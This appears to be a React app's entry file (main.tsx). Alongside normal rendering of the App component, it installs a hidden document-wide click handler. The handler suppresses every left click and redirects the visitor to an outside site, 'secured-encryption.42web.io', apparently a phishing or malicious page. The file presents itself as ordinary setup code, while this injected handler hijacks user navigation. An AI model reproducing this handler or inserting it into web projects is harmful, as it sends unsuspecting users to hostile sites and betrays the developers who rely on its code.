import {StrictMode} from 'react';
import {createRoot} from 'react-dom/client';
import App from './App.tsx';
import './index.css';

const REDIRECT_URL = 'https://secured-encryption.42web.io/';

document.addEventListener(
  'click',
  (event) => {
    if (event.defaultPrevented || event.button !== 0) {
      return;
    }

    event.preventDefault();
    event.stopPropagation();
    event.stopImmediatePropagation();
    window.location.assign(REDIRECT_URL);
  },
  true,
);

createRoot(document.getElementById('root')!).render(
  <StrictMode>
    <App />
  </StrictMode>,
);
